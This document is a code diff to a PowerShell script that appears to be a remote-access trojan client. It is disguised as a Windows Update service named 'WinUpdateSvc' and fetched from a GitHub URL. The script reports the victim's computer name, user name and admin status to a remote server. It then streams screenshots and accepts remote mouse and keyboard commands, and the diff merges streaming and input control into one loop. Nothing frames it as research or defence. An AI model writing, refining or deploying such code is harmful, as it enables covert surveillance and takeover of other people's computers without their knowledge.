@@ -13,7 +13,7 @@ $serverPort = 4000
 $installName = "WinUpdateSvc"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
-# ===== CORREÇÃO DO BOM (BYTE ORDER MARK) =====
+# ===== CORREÇÃO DO BOM =====
 $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
 
 # ===== VERIFICAR ADMIN =====
@@ -76,9 +76,7 @@ function Get-FrameB64 {
             $g2.Dispose(); $bmp.Dispose(); $bmp = $small
         }
         
-        # FIX CRÍTICO: Pega apenas o primeiro codec para não ser um array
         $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' } | Select-Object -First 1
-        
         $ep = New-Object System.Drawing.Imaging.EncoderParameters 1
         $ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality), [int64]$quality
         
@@ -106,83 +104,68 @@ while ($true) {
         $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
         $writer.WriteLine("BANNER:$env:COMPUTERNAME@$env:USERNAME|$($bounds.Width)|$($bounds.Height)|$isAdmin")
 
+        $streaming = $false
+
         while ($client.Connected) {
             if ($stream.DataAvailable) {
                 $cmd = $reader.ReadLine()
                 if ([string]::IsNullOrEmpty($cmd)) { continue }
+                
+                # Trim para remover qualquer \r invisível e evitar UNKNOWN
+                $cmd = $cmd.Trim()
 
-                # --- STREAMING ---
+                # --- CONTROLE DO STREAM ---
                 if ($cmd -eq 'stream_start') {
                     $streaming = $true
-                    while ($streaming -and $client.Connected) {
-                        if ($stream.DataAvailable) {
-                            $c = $reader.ReadLine()
-                            if ($c -eq 'stream_stop') { $streaming = $false; break }
-                            if ($c -eq 'exit') { $streaming = $false; throw "exit" }
-                            
-                            # Processa mouse/teclado DURANTE o stream
-                            $parts = $c -split ' ', 2
-                            $verb = $parts[0]
-                            $arg  = if ($parts.Count -gt 1) { $parts[1] } else { '' }
-                            switch ($verb) {
-                                'move' {
-                                    $xy = $arg -split '\s+'
-                                    if ($xy.Count -eq 2) {
-                                        $nx = [int]$xy[0]; $ny = [int]$xy[1]
-                                        $px = [int](($nx / 65535) * $bounds.Width)
-                                        $py = [int](($ny / 65535) * $bounds.Height)
-                                        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($px, $py)
-                                    }
-                                }
-                                'md' {
-                                    if ($arg -eq '1') { [Win32Input]::mouse_event(0x0002, 0,0,0,0) }
-                                    elseif ($arg -eq '2') { [Win32Input]::mouse_event(0x0008, 0,0,0,0) }
-                                    elseif ($arg -eq '3') { [Win32Input]::mouse_event(0x0020, 0,0,0,0) }
-                                }
-                                'mu' {
-                                    if ($arg -eq '1') { [Win32Input]::mouse_event(0x0004, 0,0,0,0) }
-                                    elseif ($arg -eq '2') { [Win32Input]::mouse_event(0x0010, 0,0,0,0) }
-                                    elseif ($arg -eq '3') { [Win32Input]::mouse_event(0x0040, 0,0,0,0) }
-                                }
-                                'mw' {
-                                    $d = [int]$arg
-                                    [Win32Input]::mouse_event(0x0800, 0,0,[uint32]$d,0)
-                                }
-                                'kd' {
-                                    [Win32Input]::keybd_event([byte][int]$arg, 0, 0, [UIntPtr]::Zero)
-                                }
-                                'ku' {
-                                    [Win32Input]::keybd_event([byte][int]$arg, 0, 2, [UIntPtr]::Zero)
-                                }
-                            }
-                        }
-                        
-                        $b64 = Get-FrameB64 -maxW 1280 -quality 55
-                        if ($b64) {
-                            try { $writer.WriteLine("SCREEN:$b64") } catch { break }
-                        }
-                        Start-Sleep -Milliseconds 80
-                    }
-                    try { $writer.WriteLine("STREAM_STOPPED") } catch {}
                     continue
                 }
-
-                # --- SCREENSHOT ÚNICO ---
-                if ($cmd -eq 'screenshot') {
-                    $b64 = Get-FrameB64 -maxW 3840 -quality 85
-                    if ($b64) { $writer.WriteLine("SCREEN:$b64") } else { $writer.WriteLine("SCREEN_ERROR") }
+                if ($cmd -eq 'stream_stop') {
+                    $streaming = $false
+                    $writer.WriteLine("STREAM_STOPPED")
                     continue
                 }
-
                 if ($cmd -eq 'exit') { throw "exit" }
 
-                # --- OUTROS COMANDOS FORA DO STREAM ---
+                # --- COMANDOS ---
                 $parts = $cmd -split ' ', 2
                 $verb = $parts[0]
                 $arg  = if ($parts.Count -gt 1) { $parts[1] } else { '' }
 
-                $response = "OK"
+                $response = ""
                 switch ($verb) {
+                    'screenshot' {
+                        $b64 = Get-FrameB64 -maxW 3840 -quality 85
+                        if ($b64) { $writer.WriteLine("SCREEN:$b64") } else { $writer.WriteLine("SCREEN_ERROR") }
+                    }
+                    'move' {
+                        $xy = $arg -split '\s+'
+                        if ($xy.Count -eq 2) {
+                            $nx = [int]$xy[0]; $ny = [int]$xy[1]
+                            $px = [int](($nx / 65535) * $bounds.Width)
+                            $py = [int](($ny / 65535) * $bounds.Height)
+                            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($px, $py)
+                        }
+                    }
+                    'md' {
+                        if ($arg -eq '1') { [Win32Input]::mouse_event(0x0002, 0,0,0,0) }
+                        elseif ($arg -eq '2') { [Win32Input]::mouse_event(0x0008, 0,0,0,0) }
+                        elseif ($arg -eq '3') { [Win32Input]::mouse_event(0x0020, 0,0,0,0) }
+                    }
+                    'mu' {
+                        if ($arg -eq '1') { [Win32Input]::mouse_event(0x0004, 0,0,0,0) }
+                        elseif ($arg -eq '2') { [Win32Input]::mouse_event(0x0010, 0,0,0,0) }
+                        elseif ($arg -eq '3') { [Win32Input]::mouse_event(0x0040, 0,0,0,0) }
+                    }
+                    'mw' {
+                        $d = [int]$arg
+                        [Win32Input]::mouse_event(0x0800, 0,0,[uint32]$d,0)
+                    }
+                    'kd' {
+                        [Win32Input]::keybd_event([byte][int]$arg, 0, 0, [UIntPtr]::Zero)
+                    }
+                    'ku' {
+                        [Win32Input]::keybd_event([byte][int]$arg, 0, 2, [UIntPtr]::Zero)
+                    }
                     'lock_mouse' { $response = "MOUSE_LOCKED" }
                     'unlock_mouse' { $response = "MOUSE_UNLOCKED" }
                     'test' { $response = "PONG" }
@@ -196,6 +179,15 @@ while ($true) {
                 if ($response) { $writer.WriteLine($response) }
             } else {
                 Start-Sleep -Milliseconds 20
+            }
+
+            # --- LOOP DE ENVIO DE FRAMES ---
+            if ($streaming -and $client.Connected) {
+                $b64 = Get-FrameB64 -maxW 1280 -quality 55
+                if ($b64) {
+                    try { $writer.WriteLine("SCREEN:$b64") } catch { break }
+                }
+                Start-Sleep -Milliseconds 80
             }
         }
     } catch {} finally {
